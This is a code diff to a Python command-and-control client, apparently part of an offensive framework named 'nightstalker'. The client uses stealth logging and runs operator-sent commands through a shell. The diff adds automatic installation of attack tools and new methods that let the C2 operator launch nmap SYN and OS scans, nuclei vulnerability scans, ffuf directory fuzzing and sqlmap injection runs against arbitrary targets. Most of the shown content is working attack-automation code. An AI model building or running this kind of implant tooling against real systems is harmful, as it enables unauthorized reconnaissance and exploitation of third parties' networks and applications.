@@ -20,6 +20,8 @@ import subprocess
 import tempfile
 import shutil
 
+from nightstalker.utils.tool_manager import ToolManager
+
 # Configure stealth logging
 logging.basicConfig(level=logging.ERROR)  # Minimize logging
 logger = logging.getLogger(__name__)
@@ -50,7 +52,15 @@ class C2Client:
         self.command_history = []
         self.channels = {}
         self._setup_stealth()
-        
+        # Initialize required tools
+        self._init_tools()
+
+    def _init_tools(self):
+        """Initialize and check required external tools"""
+        required_tools = ['nmap', 'nuclei', 'sqlmap', 'ffuf', 'gobuster', 'nikto', 'wpscan']
+        logger.info("Checking required tools for C2 operations...")
+        ToolManager.check_and_install_tools(required_tools, logger)
+    
     def _generate_session_id(self) -> str:
         """Generate unique session identifier"""
         hostname = platform.node()
@@ -224,6 +234,10 @@ class C2Client:
                 'timestamp': int(time.time())
             })
             
+            # Check for special tool commands
+            if self._is_tool_command(command):
+                return self._execute_tool_command(command)
+            
             # Execute command
             if platform.system() == 'Windows':
                 result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
@@ -249,6 +263,157 @@ class C2Client:
                 'error': str(e),
                 'return_code': -1
             }
+
+    def _is_tool_command(self, command: str) -> bool:
+        """Check if command is a special tool command"""
+        tool_commands = ['nmap', 'nuclei', 'sqlmap', 'ffuf', 'gobuster', 'nikto', 'wpscan']
+        return any(tool in command.lower() for tool in tool_commands)
+
+    def _execute_tool_command(self, command: str) -> Dict[str, Any]:
+        """Execute command using external security tools"""
+        try:
+            # Parse command to determine tool and arguments
+            parts = command.split()
+            tool = parts[0].lower()
+            args = parts[1:] if len(parts) > 1 else []
+            
+            # Check if tool is installed
+            if not ToolManager.is_tool_installed(tool):
+                return {
+                    'success': False,
+                    'error': f'Tool {tool} not installed',
+                    'return_code': -1
+                }
+            
+            # Execute tool with appropriate timeout
+            timeout = 300 if tool in ['nmap', 'sqlmap'] else 120
+            
+            logger.info(f"Executing tool command: {command}")
+            result = subprocess.run(parts, capture_output=True, text=True, timeout=timeout)
+            
+            return {
+                'success': result.returncode == 0,
+                'stdout': result.stdout,
+                'stderr': result.stderr,
+                'return_code': result.returncode,
+                'tool': tool
+            }
+            
+        except subprocess.TimeoutExpired:
+            return {
+                'success': False,
+                'error': f'Tool command timeout: {tool}',
+                'return_code': -1
+            }
+        except Exception as e:
+            return {
+                'success': False,
+                'error': f'Tool execution failed: {str(e)}',
+                'return_code': -1
+            }
+
+    def execute_reconnaissance(self, target: str, scan_type: str = 'basic') -> Dict[str, Any]:
+        """Execute reconnaissance using external tools"""
+        try:
+            if scan_type == 'basic':
+                # Basic port scan with nmap
+                if not ToolManager.is_tool_installed('nmap'):
+                    return {'success': False, 'error': 'Nmap not installed'}
+                
+                cmd = ['nmap', '-sS', '-sV', '-O', '--top-ports', '100', target]
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
+                
+                return {
+                    'success': result.returncode == 0,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'scan_type': 'nmap_basic',
+                    'target': target
+                }
+                
+            elif scan_type == 'web':
+                # Web vulnerability scan with nuclei
+                if not ToolManager.is_tool_installed('nuclei'):
+                    return {'success': False, 'error': 'Nuclei not installed'}
+                
+                cmd = ['nuclei', '-u', target, '-silent', '-json']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+                
+                return {
+                    'success': result.returncode == 0,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'scan_type': 'nuclei_web',
+                    'target': target
+                }
+                
+            elif scan_type == 'directory':
+                # Directory enumeration with ffuf
+                if not ToolManager.is_tool_installed('ffuf'):
+                    return {'success': False, 'error': 'FFuF not installed'}
+                
+                cmd = ['ffuf', '-u', f'{target}/FUZZ', '-w', '/usr/share/wordlists/dirb/common.txt', '-mc', '200,301,302,403']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+                
+                return {
+                    'success': result.returncode == 0,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'scan_type': 'ffuf_directory',
+                    'target': target
+                }
+                
+            else:
+                return {'success': False, 'error': f'Unknown scan type: {scan_type}'}
+                
+        except subprocess.TimeoutExpired:
+            return {'success': False, 'error': f'Reconnaissance timeout: {scan_type}'}
+        except Exception as e:
+            return {'success': False, 'error': f'Reconnaissance failed: {str(e)}'}
+
+    def execute_exploitation(self, target: str, exploit_type: str, payload: Optional[str] = None) -> Dict[str, Any]:
+        """Execute exploitation using external tools"""
+        try:
+            if exploit_type == 'sqlmap':
+                if not ToolManager.is_tool_installed('sqlmap'):
+                    return {'success': False, 'error': 'SQLMap not installed'}
+                
+                cmd = ['sqlmap', '-u', target, '--batch', '--random-agent', '--level=1', '--risk=1']
+                if payload is not None:
+                    cmd.extend(['--data', payload])
+                
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
+                
+                return {
+                    'success': result.returncode == 0,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'exploit_type': 'sqlmap',
+                    'target': target
+                }
+                
+            elif exploit_type == 'nuclei':
+                if not ToolManager.is_tool_installed('nuclei'):
+                    return {'success': False, 'error': 'Nuclei not installed'}
+                
+                cmd = ['nuclei', '-u', target, '-silent', '-json']
+                result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+                
+                return {
+                    'success': result.returncode == 0,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'exploit_type': 'nuclei',
+                    'target': target
+                }
+                
+            else:
+                return {'success': False, 'error': f'Unknown exploit type: {exploit_type}'}
+                
+        except subprocess.TimeoutExpired:
+            return {'success': False, 'error': f'Exploitation timeout: {exploit_type}'}
+        except Exception as e:
+            return {'success': False, 'error': f'Exploitation failed: {str(e)}'}
     
     def add_channel(self, name: str, channel):
         """Add communication channel"""
